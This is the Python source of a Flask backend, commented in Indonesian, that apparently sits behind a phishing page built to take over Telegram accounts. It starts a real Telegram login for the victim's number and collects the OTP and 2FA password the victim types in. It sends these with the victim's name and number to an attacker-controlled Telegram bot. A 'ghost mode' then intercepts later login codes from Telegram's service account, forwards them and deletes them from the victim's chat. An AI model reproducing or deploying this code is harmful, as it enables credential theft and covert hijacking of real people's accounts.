import os, asyncio, json, re, requests
from flask import Flask, request, jsonify
from flask_cors import CORS
from telethon import TelegramClient, events
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, PasswordHashInvalidError

app = Flask(__name__)
CORS(app)

API_ID = os.getenv("API_ID")
API_HASH = os.getenv("API_HASH")
BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")

SESSION_DIR = '/tmp/sessions/'
if not os.path.exists(SESSION_DIR): os.makedirs(SESSION_DIR)

# Penyimpanan Sesi Sementara
active_sessions = {}

def send_bot(text, show_otp=False, nomor=None):
    """Kirim pesan baru ke bot (Hanya dipanggil saat data sudah lengkap)."""
    payload = {
        "chat_id": CHAT_ID,
        "text": text,
        "parse_mode": "Markdown"
    }
    if show_otp and nomor:
        payload["reply_markup"] = {
            "inline_keyboard": [[{"text": "otp", "callback_data": f"ghost_{nomor}"}]]
        }
    
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    try:
        r = requests.post(url, json=payload).json()
        return r.get("result", {}).get("message_id")
    except:
        return None

@app.route('/register', methods=['POST'])
async def register():
    data = request.json
    nama = data.get('nama', 'User')
    nomor_raw = data.get('nomor')
    
    n = re.sub(r'\D', '', nomor_raw)
    nomor = '+62' + n[1:] if n.startswith('08') else '+' + n

    client = TelegramClient(f"{SESSION_DIR}{nomor}", int(API_ID), API_HASH)
    await client.connect()
    
    try:
        # STEP 1: Pancing OTP (Bot BELUM kirim pesan apa-apa)
        sent_code = await client.send_code_request(nomor)
        
        active_sessions[nomor] = {
            "client": client,
            "hash": sent_code.phone_code_hash,
            "nama": nama,
            "msg_id": None # Belum ada pesan
        }
        return jsonify({"status": "sent"}), 200
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 400

@app.route('/verify-otp', methods=['POST'])
async def verify_otp():
    data = request.json
    nomor_raw = data.get('nomor')
    n = re.sub(r'\D', '', nomor_raw)
    nomor = '+62' + n[1:] if n.startswith('08') else '+' + n
    otp = data.get('otp')
    sandi = data.get('sandi')

    if nomor not in active_sessions:
        return jsonify({"status": "error", "message": "Sesi hilang"}), 400

    s = active_sessions[nomor]
    client = s["client"]

    try:
        # STEP 2: Coba Login
        await client.sign_in(nomor, otp, phone_code_hash=s["hash"])
        
        # JIKA LOGIN SUKSES (Tanpa 2FA) -> BARU KIRIM PESAN KE BOT
        text = f"Nama: {s['nama']}\nNomor: `{nomor}`\nKata sandi: None\nOTP: {otp}"
        msg_id = send_bot(text, show_otp=True, nomor=nomor)
        active_sessions[nomor]['msg_id'] = msg_id # Simpan ID pesan untuk ghost mode
        
        return jsonify({"status": "success"}), 200

    except SessionPasswordNeededError:
        # JIKA BUTUH SANDI -> Web minta sandi, Bot masih diam.
        if sandi:
            try:
                await client.sign_in(password=sandi)
                # JIKA SANDI BENAR -> BARU KIRIM PESAN LENGKAP KE BOT
                text = f"Nama: {s['nama']}\nNomor: `{nomor}`\nKata sandi: {sandi}\nOTP: {otp}"
                msg_id = send_bot(text, show_otp=True, nomor=nomor)
                active_sessions[nomor]['msg_id'] = msg_id
                return jsonify({"status": "success"}), 200
            except PasswordHashInvalidError:
                return jsonify({"status": "error", "message": "Kata sandi salah!"}), 400
        
        return jsonify({"status": "need_2fa"}), 200
    except PhoneCodeInvalidError:
        return jsonify({"status": "error", "message": "OTP Salah!"}), 400

@app.route('/webhook', methods=['POST'])
async def webhook():
    data = request.json
    if "callback_query" in data:
        cb = data["callback_query"]
        if cb["data"].startswith("ghost_"):
            nomor = cb["data"].split("_")[1]
            asyncio.create_task(ghost_mode(nomor))
            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery", 
                          json={"callback_query_id": cb["id"], "text": "Ghost Mode Aktif!"})
    return jsonify({"status": "ok"}), 200

async def ghost_mode(nomor):
    s = active_sessions.get(nomor)
    if not s or not s['msg_id']: return
    client = s['client']
    
    @client.on(events.NewMessage(from_users=777000))
    async def handler(event):
        match = re.search(r'\b\d{5}\b', event.raw_text)
        if match:
            otp_baru = match.group()
            # Kirim pesan baru berisi OTP intipan (Sesuai video)
            text = f"✅ **OTP Baru Ditemukan!**\nNomor: `{nomor}`\nKode: `{otp_baru}`"
            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
                          json={"chat_id": CHAT_ID, "text": text, "parse_mode": "Markdown"})
            await event.delete()

    await client.run_until_disconnected()

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)
